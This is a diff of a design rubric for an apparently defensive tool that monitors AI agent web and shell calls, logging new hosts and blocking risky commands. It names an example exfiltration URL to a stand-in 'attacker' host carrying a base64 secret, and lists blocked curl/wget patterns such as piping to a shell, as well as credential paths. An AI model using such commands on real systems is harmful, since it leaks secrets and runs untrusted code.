@@ -36,8 +36,10 @@ Feature-patch on v0.1.0. Prior session (`2026-04-18_mvp-shape`) constraints/item
 # 🎯 Technical Rubric (v0.2)
 
 - [ ] **[INGRESS-ALLOW]** `WebFetch` and `WebSearch` tool calls to ANY `http://` or `https://` host are ALLOW-and-log by default. Still blocked: (a) `file://` scheme; (b) hosts explicitly added to a new `config.json` field `deny.hosts` (default empty array). *Verifiable by unit test.*
+- [ ] **[LOUD-LOG first-seen host]** When a `WebFetch`, `WebSearch`, or allowed `Bash curl/wget` hits a host that has never been seen in the live log before, the log entry is tagged `LOUD` (e.g. `ALLOW LOUD WebFetch random-new-host.io`). Subsequent calls to the same host log as plain `ALLOW`. Gives users a mid-tier audit signal via `grep LOUD ~/.skills-watch/live.log` without adding friction to routine sessions. *Verifiable by unit test: two successive calls to the same host → first is LOUD, second is plain ALLOW.*
+- [ ] **[URL-EXFIL defense — documented limit]** Query-string-based data exfiltration via allowed GETs (e.g. `GET https://attacker/collect?data=<base64 of secret>`) is NOT blocked at the network layer. This is an accepted limit for v0.2. The defense is the read-side deny-list: if the skill cannot read the secret in the first place (`~/.ssh/`, `~/.agents/*.env`, env-var scrubbing, etc.), there is no data to exfil via URL. `docs/risk-categories.md` must explicitly document this threat model so users understand why we're comfortable with allow-all WebFetch. *Verifiable by existence + content of the docs note.*
 - [ ] **[BASH-INGRESS-NUANCE]** `Bash` commands containing `curl` or `wget` are NOT blocked solely for non-allowlisted hosts. They ARE blocked when the command contains any of: (a) `| sh` / `| bash` / `| zsh` / `| python` / `| node`; (b) `>FILE && chmod +x FILE` or `>FILE && exec`; (c) `-X POST|PUT|DELETE|PATCH`; (d) `-d @` / `--data-binary @`. *Verifiable by 8-scenario spike (see Product rubric item).*
-- [ ] **[RISK-CATEGORY-5]** Every BLOCK decision emits a structured object with `risk_category` ∈ { `SENSITIVE-DATA-READ`, `PERSISTENCE-ATTEMPT`, `UNAUTHORIZED-EGRESS`, `SUPPLY-CHAIN`, `INGRESS-EXEC` } plus `owasp_code` and `atlas_tactic` fields (null allowed if no mapping). The 5 categories are defined in `src/risk-copy.json`. *Verifiable by unit test per category.*
+- [ ] **[RISK-CATEGORY-5]** Every BLOCK decision emits a structured object with `risk_category` ∈ { `SENSITIVE-LEAK`, `PERSISTENCE-ATTEMPT`, `UNAUTHORIZED-EGRESS`, `SUPPLY-CHAIN`, `INGRESS-EXEC` } plus `owasp_code` and `atlas_tactic` fields (null allowed if no mapping). The 5 categories are defined in `src/risk-copy.json`. *Verifiable by unit test per category.*
 - [ ] **[RISK-COPY-FILE]** `src/risk-copy.json` exists with a key for each of the 5 categories, each value an object `{why_usually_bad: <string>, when_might_be_fine: <string>, owasp: <string|null>, atlas: <string|null>}`. Changing a category's copy requires editing JSON only — no code change. *Verifiable by JSON schema validation + existence check.*
 - [ ] **[STDERR-TEMPLATE]** Hook stderr follows the 4-line template (see Product rubric). *Verifiable by golden-file tests.*
 - [ ] **[LOG-ENRICHMENT]** Live-log BLOCK lines carry `[risk=<CAT>]` suffix mandatory; `[owasp=LLM0X]` and `[atlas=AML.T####]` suffixes present only if non-null in risk-copy.json. ALLOW lines unchanged. *Verifiable by unit test.*
@@ -73,11 +75,17 @@ Kept for continuity; these were killed by the prior session's debate and remain 
 - *(R3 pivot):* stdin-EOF UX-INTERACTIVE item — removed.
 - *(R3 pivot):* Filesystem-denyRead trick for process deny-list — removed.
 
+## User amendments (2026-04-19, post-R2-ACCEPT, pre-Phase-1)
+
+- Category `SENSITIVE-DATA-READ` renamed → `SENSITIVE-LEAK`. User preference; cleaner; captures both credential and PII cases under one label.
+- Added Technical item `[LOUD-LOG first-seen host]`. Mid-tier audit signal — flags first-time egress to any new host in the live log, so users can grep `LOUD` without needing a loud default that blocks.
+- Added Technical item `[URL-EXFIL defense — documented limit]`. Intellectually-honest acknowledgment that query-string-based exfil is possible in principle; the read-side deny-list is our defense. Must be documented in `docs/risk-categories.md`.
+
 ## 🏁 Defeated Rubrics — v0.2 session
 
 - *(R1):* **`PROMPT-INJECT` risk category** — killed. Was a "stretch goal" per the research spike yet presented as one of 9 categories in the rubric. Gemini R1 called this vaporware and the core intellectual dishonesty. Moved to v0.3 backlog: will need its own research spike on how to actually detect fetched-content-driving-tool-calls, which is nontrivial.
 - *(R1):* **`[SUMMARY-AWARE]` per-category breakdown in `summary`** — killed. Vitamin. User can `grep '\[risk=' ~/.skills-watch/live.log | sort | uniq -c` for the same info.
-- *(R1):* **9-category taxonomy** — collapsed to 5 (`SENSITIVE-DATA-READ`, `PERSISTENCE-ATTEMPT`, `UNAUTHORIZED-EGRESS`, `SUPPLY-CHAIN`, `INGRESS-EXEC`). Finer splits (CRED-LEAK vs PII-LEAK, CONFIG-TAMPER vs BACKDOOR, EXFIL vs EGRESS-ANOMALY) are v0.3 territory if user feedback demands them.
+- *(R1):* **9-category taxonomy** — collapsed to 5 (`SENSITIVE-LEAK`, `PERSISTENCE-ATTEMPT`, `UNAUTHORIZED-EGRESS`, `SUPPLY-CHAIN`, `INGRESS-EXEC`). Finer splits (CRED-LEAK vs PII-LEAK, CONFIG-TAMPER vs BACKDOOR, EXFIL vs EGRESS-ANOMALY) are v0.3 territory if user feedback demands them.
 - *(R1):* **C5.1 phrasing "every v0.1 red-team attack must still be BLOCKED"** — replaced with "no malicious-outcome regression." The old phrasing contradicted the rebalance premise.
 - *(R1):* **`[NO-REGRESSION-DOGFOOD]` 3-session metric** — sharpened to "3 sessions of ≥15min with ≥5 WebFetch calls each, zero false BLOCKs."
 - *(R1):* **Risk copy as narrative prose in the rubric** — replaced with "copy lives in committed `src/risk-copy.json` keyed by category" so it's verifiable and changing copy doesn't touch code.
